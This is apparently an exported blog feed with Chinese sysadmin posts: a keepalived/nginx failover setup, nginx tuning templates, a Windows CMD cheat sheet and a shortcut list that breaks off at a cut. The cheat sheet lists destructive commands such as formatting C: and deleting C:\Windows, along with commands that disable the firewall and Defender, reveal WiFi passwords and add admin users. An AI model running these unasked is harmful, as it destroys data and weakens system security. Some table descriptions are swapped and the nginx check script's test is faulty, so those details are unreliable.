<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">bin/bash</span></span><br><span class="line">counter=$(ps -C nginx |grep -v PID |wc -l) #取命令结果赋值给变量</span><br><span class="line">if [ $counter==0 ];then   #判断变量里的值如果等于0</span><br><span class="line">    systemctl start nginx   #尝试启动nginx  </span><br><span class="line">    sleep 5</span><br><span class="line">    counter=$(ps -C nginx |grep -v PID |wc -l)</span><br><span class="line">    if [ $counter==0 ];then #在判断变量里的值如果还等于0</span><br><span class="line">        systemctl stop keepalived  </span><br><span class="line">    fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>脚本授权 chmod +x &#x2F;etc&#x2F;keepalived&#x2F;check_nginx.sh</p>
<p>2、准备keepalived的配置 192.168.133.131配置如下：配置前先备份原有配置，原有配置项较多，有些不需要。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /etc/keepalived/keepalived.conf   /etc/keepalived/keepalived.conf.bak</span><br></pre></td></tr></table></figure>
<p>vim &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf 输入如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">#检测脚本定义</span><br><span class="line">vrrp_script check_nginx &#123;     #脚本模块</span><br><span class="line">    script  &quot;/etc/keepalived/check_nginx.sh&quot;    #脚本路径</span><br><span class="line">interval 2    #检测脚本时间2秒</span><br><span class="line">weight 10     #优先级</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">   router_id master-ip   </span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   script_user root</span><br><span class="line">   enable_script_security</span><br><span class="line"></span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state MASTER         # 指定keepalived的角色，MASTER为主，BACKUP为备</span><br><span class="line">    interface ens33      # 当前进行vrrp通讯的网络接口卡(当前centos的网卡) 用ifconfig查看你具体的网卡</span><br><span class="line">    virtual_router_id 51 # 虚拟路由编号，主从要一致</span><br><span class="line">    priority 100         # 优先级，数值越大，获取处理请求的优先级越高</span><br><span class="line">    advert_int 1         # 检查间隔，默认为1s(vrrp组播周期秒数)</span><br><span class="line">    authentication &#123;     #设置验证类型和密码，MASTER和BACKUP必须使用相同的密码才能正常通信</span><br><span class="line">        auth_type PASS  </span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123; </span><br><span class="line">        check_nginx      #（调用检测脚本）</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.133.130  # 定义虚拟ip(VIP)，可多设，每行一个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>192.168.133.132 配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">! Configuration File for keepalived</span><br><span class="line"></span><br><span class="line">vrrp_script check_nginx &#123;     #脚本模块</span><br><span class="line">    script  &quot;/etc/keepalived/check_nginx.sh&quot;    #脚本路径</span><br><span class="line">interval 2    #检测脚本时间2秒</span><br><span class="line">weight 10    #优先级</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">global_defs &#123;</span><br><span class="line">  router_id slave-ip</span><br><span class="line">   vrrp_skip_check_adv_addr</span><br><span class="line">   script_user root</span><br><span class="line">   enable_script_security</span><br><span class="line"></span><br><span class="line">   vrrp_strict</span><br><span class="line">   vrrp_garp_interval 0</span><br><span class="line">   vrrp_gna_interval 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state BACKUP</span><br><span class="line">    interface ens33</span><br><span class="line">    virtual_router_id 51</span><br><span class="line">    priority 99</span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123;</span><br><span class="line">        check_nginx</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.133.130</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="启动keepalived"><a href="#启动keepalived" class="headerlink" title="启动keepalived"></a>启动keepalived</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start keepalived</span><br></pre></td></tr></table></figure>
<p>启动完成不报错即可,验证是否绑定虚拟ip,通过命令 ip as 查看</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx总结四【并发时参数配置】</title>
    <url>/cnblogs.github.io/p/ebe7.html</url>
    <content><![CDATA[<h3 id="一、连接处理的”黄金搭档”：worker-processes-×-worker-connections"><a href="#一、连接处理的”黄金搭档”：worker-processes-×-worker-connections" class="headerlink" title="一、连接处理的”黄金搭档”：worker_processes × worker_connections"></a>一、连接处理的”黄金搭档”：worker_processes × worker_connections</h3><p>90%的人不知道的计算公式：Nginx最大并发连接数 &#x3D; worker_processes × worker_connections &#x2F; 2（反向代理场景）。如果你的服务器是8核CPU，却只配置了1个worker进程，相当于8车道高速只开了1个入口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes auto;  # 自动匹配CPU核心数</span><br><span class="line">worker_connections 65535;  # 单进程连接数，需配合系统ulimit调整</span><br><span class="line">worker_rlimit_nofile 100000;  # 突破文件描述符限制</span><br></pre></td></tr></table></figure>

<h3 id="二、长连接管理：keepalive-timeout的艺术"><a href="#二、长连接管理：keepalive-timeout的艺术" class="headerlink" title="二、长连接管理：keepalive_timeout的艺术"></a>二、长连接管理：keepalive_timeout的艺术</h3><p>短连接就像每次买咖啡都要重新排队，长连接则是办会员卡免排队。默认75秒的keepalive_timeout在高并发场景下会导致大量TIME_WAIT连接堆积。<br><strong>电商案例：</strong>当QPS达到10000时，默认配置会导致每秒100个连接被强制关闭。调整参数后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keepalive_timeout 30s;  # 连接空闲超时时间</span><br><span class="line">keepalive_requests 10000;  # 单连接最大请求数</span><br></pre></td></tr></table></figure>
<p>连接重建次数减少67%，CPU利用率下降22%。</p>
<h3 id="三、数据压缩的”性价比之王”：gzip压缩策略"><a href="#三、数据压缩的”性价比之王”：gzip压缩策略" class="headerlink" title="三、数据压缩的”性价比之王”：gzip压缩策略"></a>三、数据压缩的”性价比之王”：gzip压缩策略</h3><p>启用gzip compression相当于给数据传输装上”压缩机”。某资讯网站通过优化gzip配置，页面加载速度提升40%，带宽成本降低58%。<br><strong>生产级配置：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip on;</span><br><span class="line">gzip_comp_level 6;  # 压缩级别(1-9)，6为性能平衡点</span><br><span class="line">gzip_types text/plain application/json application/javascript;</span><br><span class="line">gzip_min_length 1k;  # 小文件不压缩</span><br><span class="line">gzip_vary on;  # 支持CDN缓存</span><br></pre></td></tr></table></figure>

<h3 id="四、零拷贝传输：sendfile-tcp-nopush组合拳"><a href="#四、零拷贝传输：sendfile-tcp-nopush组合拳" class="headerlink" title="四、零拷贝传输：sendfile + tcp_nopush组合拳"></a>四、零拷贝传输：sendfile + tcp_nopush组合拳</h3><p>传统文件传输需要4次数据拷贝，而sendfile直接在内核空间完成数据传输，减少50%的I&#x2F;O操作。配合tcp_nopush可将多个小数据包合并发送，特别适合静态资源服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sendfile on;  # 启用零拷贝</span><br><span class="line">tcp_nopush on;  # 合并数据包发送</span><br><span class="line">tcp_nodelay on;  # 实时性场景禁用Nagle算法</span><br></pre></td></tr></table></figure>
<p>某视频网站启用该配置后，静态资源吞吐量提升3倍，服务器负载下降40%。</p>
<h3 id="五、文件描述符优化：worker-rlimit-nofile"><a href="#五、文件描述符优化：worker-rlimit-nofile" class="headerlink" title="五、文件描述符优化：worker_rlimit_nofile"></a>五、文件描述符优化：worker_rlimit_nofile</h3><p>“Too many open files”错误的本质是文件描述符耗尽。系统默认限制通常是1024，而高并发场景需要将其调整至65535以上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_rlimit_nofile 65535;  # 每个worker进程的文件描述符限制</span><br></pre></td></tr></table></figure>
<p>同时需修改系统参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;nginx soft nofile 65535&quot; &gt;&gt; /etc/security/limits.conf</span><br></pre></td></tr></table></figure>

<h3 id="六、静态文件缓存：open-file-cache"><a href="#六、静态文件缓存：open-file-cache" class="headerlink" title="六、静态文件缓存：open_file_cache"></a>六、静态文件缓存：open_file_cache</h3><p>频繁访问的静态文件（图片&#x2F;CSS&#x2F;JS）会产生大量磁盘I&#x2F;O。open_file_cache能缓存文件元信息，命中率可达80%以上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open_file_cache max=100000 inactive=60s;</span><br><span class="line">open_file_cache_valid 30s;</span><br><span class="line">open_file_cache_min_uses 2;</span><br></pre></td></tr></table></figure>
<p>某图片分享平台启用后，磁盘I&#x2F;O减少65%，平均响应时间从120ms降至35ms。</p>
<h3 id="七、流量控制：limit-req-zone防雪崩"><a href="#七、流量控制：limit-req-zone防雪崩" class="headerlink" title="七、流量控制：limit_req_zone防雪崩"></a>七、流量控制：limit_req_zone防雪崩</h3><p>秒杀场景下的突发流量可能瞬间击垮后端服务。limit_req_zone通过漏桶算法平滑请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;</span><br><span class="line">location /seckill &#123;</span><br><span class="line">    limit_req zone=req_limit burst=20 nodelay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该配置允许每秒10个请求，突发不超过20个，有效防止数据库连接耗尽。</p>
<h3 id="八、HTTP-2多路复用：一个连接搞定所有请求"><a href="#八、HTTP-2多路复用：一个连接搞定所有请求" class="headerlink" title="八、HTTP&#x2F;2多路复用：一个连接搞定所有请求"></a>八、HTTP&#x2F;2多路复用：一个连接搞定所有请求</h3><p>HTTP&#x2F;1.x下每个请求需要单独连接，而HTTP&#x2F;2的多路复用可在一个连接上并行处理30+请求。某门户网站启用后，连接数减少85%，首屏加载时间缩短52%。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen 443 ssl http2;  # 启用HTTP/2</span><br><span class="line">ssl_protocols TLSv1.2 TLSv1.3;</span><br></pre></td></tr></table></figure>

<h3 id="九、代理缓冲：proxy-buffering减轻后端压力"><a href="#九、代理缓冲：proxy-buffering减轻后端压力" class="headerlink" title="九、代理缓冲：proxy_buffering减轻后端压力"></a>九、代理缓冲：proxy_buffering减轻后端压力</h3><p>当后端API响应缓慢时，proxy_buffering能避免Nginx worker进程被阻塞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy_buffering on;</span><br><span class="line">proxy_buffer_size 16k;</span><br><span class="line">proxy_buffers 4 64k;</span><br><span class="line">proxy_busy_buffers_size 128k;</span><br></pre></td></tr></table></figure>
<p>某API服务启用后，后端超时错误减少90%，并发处理能力提升3倍。</p>
<h3 id="十、内核参数调优：网络性能的最后一块拼图"><a href="#十、内核参数调优：网络性能的最后一块拼图" class="headerlink" title="十、内核参数调优：网络性能的最后一块拼图"></a>十、内核参数调优：网络性能的最后一块拼图</h3><p>Nginx性能受限于操作系统内核参数，关键优化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /etc/sysctl.conf</span><br><span class="line">net.core.somaxconn = 65535  # 连接队列长度</span><br><span class="line">net.ipv4.tcp_max_syn_backlog = 65535  # SYN队列长度</span><br><span class="line">net.ipv4.tcp_tw_reuse = 1  # 复用TIME-WAIT连接</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分场景配置模板（直接复制可用）</p>
</blockquote>
<p><strong>静态资源服务器</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes auto;</span><br><span class="line">worker_connections 65535;</span><br><span class="line">sendfile on;</span><br><span class="line">tcp_nopush on;</span><br><span class="line">gzip on;</span><br><span class="line">gzip_comp_level 6;</span><br><span class="line">open_file_cache max=100000 inactive=60s;</span><br></pre></td></tr></table></figure>

<p><strong>API反向代理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes auto;</span><br><span class="line">worker_connections 32768;</span><br><span class="line">keepalive_timeout 15s;</span><br><span class="line">keepalive_requests 1000;</span><br><span class="line">proxy_buffering on;</span><br><span class="line">limit_req_zone $binary_remote_addr zone=api_limit:10m rate=50r/s;</span><br></pre></td></tr></table></figure>

<p><strong>高并发秒杀场景</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">worker_processes auto;</span><br><span class="line">worker_connections 65535;</span><br><span class="line">worker_rlimit_nofile 100000;</span><br><span class="line">limit_req_zone $binary_remote_addr zone=seckill_limit:20m rate=200r/s;</span><br><span class="line">listen 443 ssl http2;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows总结一【CMD常用命令详解】</title>
    <url>/cnblogs.github.io/p/32386.html</url>
    <content><![CDATA[<h3 id="文件与磁盘操作"><a href="#文件与磁盘操作" class="headerlink" title="文件与磁盘操作"></a>文件与磁盘操作</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>md 新建文件夹</td>
<td>新建目录</td>
</tr>
<tr>
<td>mkdir 新建文件夹</td>
<td>同上</td>
</tr>
<tr>
<td>dir</td>
<td>列出当前目录内容</td>
</tr>
<tr>
<td>dir &#x2F;s &#x2F;ah</td>
<td>递归显示目录及隐藏文件</td>
</tr>
<tr>
<td>cd 目录名</td>
<td>进入指定目录</td>
</tr>
<tr>
<td>cd ..</td>
<td>返回上一级</td>
</tr>
<tr>
<td>cd &#x2F;d D:\logs</td>
<td>跨盘符切换目录</td>
</tr>
<tr>
<td>robocopy C:\src D:\backup &#x2F;MIR &#x2F;MT:8</td>
<td>多线程镜像备份</td>
</tr>
<tr>
<td>del 文件名</td>
<td>删除文件</td>
</tr>
<tr>
<td>del &#x2F;f &#x2F;q &#x2F;s 文件名</td>
<td>强制&#x2F;静默&#x2F;递归删除</td>
</tr>
<tr>
<td>*del &#x2F;F &#x2F;Q .tmp</td>
<td>强制删除临时文件</td>
</tr>
<tr>
<td>rd &#x2F;S &#x2F;Q “D:\old”</td>
<td>无提示删除非空目录</td>
</tr>
<tr>
<td>fsutil file createnew test.txt 1048576</td>
<td>生成1MB测试文件</td>
</tr>
<tr>
<td>type filename.txt</td>
<td>显示文本文件内容</td>
</tr>
<tr>
<td>copy file1.txt+file2.txt merged.txt</td>
<td>合并文件</td>
</tr>
<tr>
<td>xcopy C:\data D:\backup &#x2F;E &#x2F;H &#x2F;C</td>
<td>复制目录树</td>
</tr>
<tr>
<td>move file.txt D:\newfolder</td>
<td>移动文件</td>
</tr>
<tr>
<td>ren old.txt new.txt</td>
<td>重命名文件</td>
</tr>
<tr>
<td>attrib +h secret.txt</td>
<td>设置隐藏属性</td>
</tr>
<tr>
<td>fc file1.txt file2.txt</td>
<td>文件内容比较</td>
</tr>
<tr>
<td>find “error” log.txt</td>
<td>文件中搜索字符串</td>
</tr>
<tr>
<td>tree &#x2F;F</td>
<td>显示目录树结构</td>
</tr>
<tr>
<td>md newfolder</td>
<td>创建新目录</td>
</tr>
<tr>
<td>cipher &#x2F;W:D:</td>
<td>彻底擦除磁盘剩余空间</td>
</tr>
<tr>
<td>compact &#x2F;c &#x2F;s</td>
<td>启用NTFS压缩</td>
</tr>
<tr>
<td>diskpart</td>
<td>启动磁盘分区工具</td>
</tr>
<tr>
<td>format E: &#x2F;FS:NTFS &#x2F;Q</td>
<td>快速格式化磁盘</td>
</tr>
</tbody></table>
<h3 id="系统管理与信息查看"><a href="#系统管理与信息查看" class="headerlink" title="系统管理与信息查看"></a>系统管理与信息查看</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>systeminfo</td>
<td>系统信息</td>
</tr>
<tr>
<td>hostname</td>
<td>查看机器名</td>
</tr>
<tr>
<td>ver</td>
<td>操作系统版本</td>
</tr>
<tr>
<td>tasklist</td>
<td>当前进程列表</td>
</tr>
<tr>
<td>taskkill &#x2F;PID 进程号 &#x2F;F</td>
<td>结束进程</td>
</tr>
<tr>
<td>wmic cpu get Name</td>
<td>CPU信息</td>
</tr>
<tr>
<td>wmic memorychip get capacity</td>
<td>查看计划任务</td>
</tr>
<tr>
<td>schtasks &#x2F;query &#x2F;fo LIST</td>
<td>内存信息</td>
</tr>
<tr>
<td>set</td>
<td>环境变量</td>
</tr>
<tr>
<td>cleanmgr</td>
<td>启动磁盘清理工具</td>
</tr>
<tr>
<td>msinfo32</td>
<td>打开系统信息面板</td>
</tr>
<tr>
<td>winver</td>
<td>显示Windows版本</td>
</tr>
<tr>
<td>services.msc</td>
<td>服务管理控制台</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td>计算机综合管理</td>
</tr>
<tr>
<td>devmgmt.msc</td>
<td>设备管理器</td>
</tr>
<tr>
<td>eventvwr</td>
<td>事件查看器</td>
</tr>
<tr>
<td>perfmon</td>
<td>性能监视器</td>
</tr>
<tr>
<td>taskschd.msc</td>
<td>任务计划程序</td>
</tr>
<tr>
<td>lusrmgr.msc</td>
<td>本地用户和组管理</td>
</tr>
<tr>
<td>control</td>
<td>打开控制面板</td>
</tr>
<tr>
<td>appwiz.cpl</td>
<td>程序和功能面板</td>
</tr>
<tr>
<td>sysdm.cpl</td>
<td>系统属性设置</td>
</tr>
<tr>
<td>secpol.msc</td>
<td>本地安全策略</td>
</tr>
<tr>
<td>rsop.msc</td>
<td>组策略结果集</td>
</tr>
<tr>
<td>slmgr.vbs -xpr</td>
<td>检查系统激活状态</td>
</tr>
<tr>
<td>wmic qfe list</td>
<td>查看已安装补丁</td>
</tr>
<tr>
<td>wmic bios get serialnumber</td>
<td>获取BIOS序列号</td>
</tr>
<tr>
<td>powercfg &#x2F;energy</td>
<td>生成电源效率报告</td>
</tr>
<tr>
<td>time</td>
<td>显示或设置系统时间</td>
</tr>
<tr>
<td>date</td>
<td>显示或设置系统日期</td>
</tr>
<tr>
<td>shutdown &#x2F;r &#x2F;t 0</td>
<td>立即重启系统</td>
</tr>
<tr>
<td>shutdown &#x2F;s &#x2F;t 0</td>
<td>立即关机</td>
</tr>
</tbody></table>
<h3 id="磁盘和文件系统工具"><a href="#磁盘和文件系统工具" class="headerlink" title="磁盘和文件系统工具"></a>磁盘和文件系统工具</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>diskmgmt.msc</td>
<td>磁盘分区管理</td>
</tr>
<tr>
<td>chkdsk C:</td>
<td>检查磁盘</td>
</tr>
<tr>
<td>chkdsk &#x2F;f</td>
<td>检查磁盘错误并修复（需重启） [管理员]</td>
</tr>
<tr>
<td>diskpart</td>
<td>硬盘分区工具</td>
</tr>
<tr>
<td>format D:</td>
<td>格式化磁盘</td>
</tr>
<tr>
<td>vol</td>
<td>显示卷标与序列号</td>
</tr>
<tr>
<td>fsutil</td>
<td>文件系统高级操作</td>
</tr>
<tr>
<td>sfc &#x2F;scannow</td>
<td>扫描并修复系统文件损坏 [管理员]</td>
</tr>
<tr>
<td>defrag C: &#x2F;O</td>
<td>文件系统高级操作</td>
</tr>
<tr>
<td>fsutil</td>
<td>优化机械硬盘碎片（SSD无需使用）</td>
</tr>
</tbody></table>
<h3 id="网络操作与排查"><a href="#网络操作与排查" class="headerlink" title="网络操作与排查"></a>网络操作与排查</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ipconfig &#x2F;all</td>
<td>显示完整网络配置</td>
</tr>
<tr>
<td>ipconfig &#x2F;release</td>
<td>释放当前IP</td>
</tr>
<tr>
<td>ipconfig &#x2F;renew</td>
<td>重新请求IP</td>
</tr>
<tr>
<td>ipconfig &#x2F;flushdns</td>
<td>清除DNS缓存</td>
</tr>
<tr>
<td>ipconfig &#x2F;registerdns</td>
<td>刷新DNS注册</td>
</tr>
<tr>
<td>ping <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>测和百度的网络是否通畅</td>
</tr>
<tr>
<td>ping 192.168.1.1</td>
<td>路由器&#x2F;网关连通</td>
</tr>
<tr>
<td>ping 域名&#x2F;IP -n 10</td>
<td>连续发10个包</td>
</tr>
<tr>
<td>ping 8.8.8.8 -t</td>
<td>持续测试网络连通性</td>
</tr>
<tr>
<td>tracert <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>路由追踪</td>
</tr>
<tr>
<td>tracert -d <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>跳过DNS解析</td>
</tr>
<tr>
<td>pathping <a href="http://www.baidu.com/">www.baidu.com</a></td>
<td>跳点延时及丢包率分析</td>
</tr>
<tr>
<td>netstat -an</td>
<td>所有监听端口、连接</td>
</tr>
<tr>
<td>netstat -ano</td>
<td>再带上进程PID</td>
</tr>
<tr>
<td>netstat -ab</td>
<td>一个进程&#x2F;应用占哪些端口</td>
</tr>
<tr>
<td>netstat -ano</td>
<td>findstr ESTABLISHED</td>
</tr>
<tr>
<td>nslookup</td>
<td>进入交互模式，能查A记录&#x2F;MX等</td>
</tr>
<tr>
<td>nslookup <a href="http://www.qq.com/">www.qq.com</a></td>
<td>DNS解析验证</td>
</tr>
<tr>
<td>arp -a</td>
<td>显示ARP缓存表</td>
</tr>
<tr>
<td>netsh interface ip show config</td>
<td>显示网卡配置</td>
</tr>
<tr>
<td>netsh interface ip set dns “以太网” static 8.8.8.8</td>
<td>设置静态DNS</td>
</tr>
<tr>
<td>netsh winsock reset</td>
<td>重置网络协议栈</td>
</tr>
<tr>
<td>netsh advfirewall set allprofiles state off</td>
<td>临时关闭防火墙</td>
</tr>
<tr>
<td>netsh wlan show profiles</td>
<td>查看保存的WiFi配置</td>
</tr>
<tr>
<td>netsh wlan show profile name&#x3D;”Home” key&#x3D;clear</td>
<td>查看WiFi密码</td>
</tr>
<tr>
<td>netsh wlan connect ssid&#x3D;”Office”</td>
<td>连接指定WiFi</td>
</tr>
<tr>
<td>netsh trace start capture&#x3D;yes</td>
<td>启动网络抓包</td>
</tr>
<tr>
<td>netsh trace stop</td>
<td>停止网络抓包</td>
</tr>
<tr>
<td>route print</td>
<td>显示路由表</td>
</tr>
<tr>
<td>route add …</td>
<td>添加路由</td>
</tr>
<tr>
<td>route delete …</td>
<td>删除路由</td>
</tr>
<tr>
<td>route print</td>
<td>查看路由表</td>
</tr>
<tr>
<td>net use</td>
<td>查看网络映射驱动器</td>
</tr>
<tr>
<td>net use K: \192.168.1.100\share</td>
<td>映射网络驱动器</td>
</tr>
<tr>
<td>pathping <a href="http://www.taobao.com/">www.taobao.com</a></td>
<td>综合路由和丢包测试</td>
</tr>
<tr>
<td>getmac &#x2F;v</td>
<td>显示MAC地址详情</td>
</tr>
<tr>
<td>net view</td>
<td>查看局域网共享资源</td>
</tr>
<tr>
<td>net share</td>
<td>管理共享文件夹</td>
</tr>
<tr>
<td>ftp</td>
<td>启动FTP客户端</td>
</tr>
<tr>
<td>telnet</td>
<td>启动Telnet客户端</td>
</tr>
<tr>
<td>scp <a href="mailto:&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x38;&#x2e;&#49;&#51;&#x32;">&#x72;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x38;&#x2e;&#49;&#51;&#x32;</a>:&#x2F;root&#x2F;test002 .&#x2F;Desktop</td>
<td>scp root@服务器ip:文件绝对路径</td>
</tr>
<tr>
<td>scp Desktop\test003.txt <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#x2e;&#x31;&#51;&#x32;">&#114;&#x6f;&#x6f;&#116;&#64;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#x38;&#x2e;&#x31;&#51;&#x32;</a>:&#x2F;root&#x2F;</td>
<td>scp Desk\文件路径 root@服务器ip:文件绝对路径</td>
</tr>
</tbody></table>
<h3 id="进程与用户管理"><a href="#进程与用户管理" class="headerlink" title="进程与用户管理"></a>进程与用户管理</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>tasklist &#x2F;svc</td>
<td>查看进程及关联服务</td>
</tr>
<tr>
<td>taskkill &#x2F;F &#x2F;IM chrome.exe</td>
<td>强制结束进程</td>
</tr>
<tr>
<td>taskkill &#x2F;PID 1234 &#x2F;T</td>
<td>结束进程树</td>
</tr>
<tr>
<td>net start 服务名</td>
<td>启动服务</td>
</tr>
<tr>
<td>net stop 服务名</td>
<td>停止服务</td>
</tr>
<tr>
<td>start notepad</td>
<td>启动应用程序</td>
</tr>
<tr>
<td>net user Tech P@ssw0rd &#x2F;add</td>
<td>创建用户</td>
</tr>
<tr>
<td>net localgroup administrators Tech &#x2F;add</td>
<td>提权为管理员</td>
</tr>
<tr>
<td>net user Tech &#x2F;delete</td>
<td>删除用户</td>
</tr>
<tr>
<td>query session</td>
<td>查看远程桌面会话</td>
</tr>
<tr>
<td>whoami</td>
<td>显示当前用户</td>
</tr>
<tr>
<td>runas &#x2F;user:admin cmd</td>
<td>以其他用户身份运行</td>
</tr>
<tr>
<td>qwinsta</td>
<td>显示终端服务会话（同query session）</td>
</tr>
<tr>
<td>sc query</td>
<td>查看服务状态</td>
</tr>
<tr>
<td>sc stop WinDefend</td>
<td>停止服务</td>
</tr>
<tr>
<td>sc config DiagTrack start&#x3D; disabled</td>
<td>禁用服务</td>
</tr>
<tr>
<td>wmic process get name,processid</td>
<td>获取进程列表</td>
</tr>
</tbody></table>
<h3 id="运维实战命令"><a href="#运维实战命令" class="headerlink" title="运维实战命令"></a>运维实战命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>for &#x2F;L %i in (1,1,100) do ping -n 1 192.168.1.%i</td>
<td>批量Ping扫描</td>
</tr>
<tr>
<td>**<em>forfiles &#x2F;p “C:\logs” &#x2F;s &#x2F;m <em>.log &#x2F;d -7 &#x2F;c “cmd &#x2F;c del @path”</em>*</em></td>
<td>自动清理日志</td>
</tr>
<tr>
<td>auditpol &#x2F;set &#x2F;category:”Account Logon” &#x2F;success:enable</td>
<td>启用登录审核</td>
</tr>
<tr>
<td>wmic product get name,version &gt; software.csv</td>
<td>导出软件清单</td>
</tr>
<tr>
<td>wmic memorychip get capacity,speed</td>
<td>获取内存信息</td>
</tr>
<tr>
<td>wmic diskdrive get model,size</td>
<td>获取硬盘信息</td>
</tr>
<tr>
<td>reg query “HKLM\Software\Microsoft\Windows\CurrentVersion\Run”</td>
<td>查看启动项</td>
</tr>
<tr>
<td>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
<td>查看计划任务详情</td>
</tr>
<tr>
<td>vssadmin list shadows</td>
<td>查看卷影副本</td>
</tr>
<tr>
<td>powercfg &#x2F;batteryreport</td>
<td>生成电池健康报告</td>
</tr>
</tbody></table>
<h3 id="高危操作预警"><a href="#高危操作预警" class="headerlink" title="高危操作预警"></a>高危操作预警</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>format C: &#x2F;FS:NTFS</td>
<td>:: 永久删除命令（不可恢复）</td>
</tr>
<tr>
<td>diskpart → clean</td>
<td>:: 永久删除命令（不可恢复）</td>
</tr>
<tr>
<td>del &#x2F;F &#x2F;S &#x2F;Q <em>.</em></td>
<td>:: 谨慎使用的命令</td>
</tr>
<tr>
<td>rd &#x2F;S &#x2F;Q C:\Windows</td>
<td>:: 谨慎使用的命令</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Window</category>
      </categories>
      <tags>
        <tag>Window</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows总结三【超实用快捷键】</title>
    <url>/cnblogs.github.io/p/580e.html</url>
    <content><![CDATA[<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + C</td>
<td>复制选中内容</td>
</tr>
<tr>
<td>Ctrl + X</td>
<td>剪切选中内容</td>
</tr>
<tr>
<td>Ctrl + V</td>
<td>粘贴</td>
</tr>
<tr>
<td>Ctrl + Z</td>
<td>撤销上一步操作</td>
</tr>
<tr>
<td>Ctrl + Y</td>
<td>恢复撤销的操作</td>
</tr>
<tr>
<td>Ctrl + A</td>
<td>全选当前内容</td>
</tr>
<tr>
<td>Ctrl + H</td>
<td>替换 (在文档中查找并替换)</td>
</tr>
<tr>
<td>Delete</td>
<td>删除选中项（到回收站）</td>
</tr>
<tr>
<td>Shift + Delete</td>
